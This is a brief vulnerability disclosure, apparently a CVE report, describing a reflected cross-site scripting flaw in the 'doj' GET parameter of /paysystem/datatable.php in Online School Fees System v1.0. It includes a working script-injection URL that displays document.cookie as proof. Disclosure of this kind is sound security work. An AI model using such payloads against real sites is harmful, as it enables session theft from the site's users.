# Online School Fees System v1.0 has reflected cross-site scripting

BUG_Author: zhangyf

Website source code address: https://www.sourcecodester.com/php/11708/online-school-fees-system.html

Vulnerability File: /paysystem/datatable.php

GET parameter "doj" exists reflected cross-site scripting vulnerability

Payload: /paysystem/datatable.php?student=1&doj=<script>alert(document.cookie)</script>&type=feesearch

The js code is successfully executed and the cookie value is returned, which proves that there is a reflected cross-site scripting vulnerability.

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/4.png)
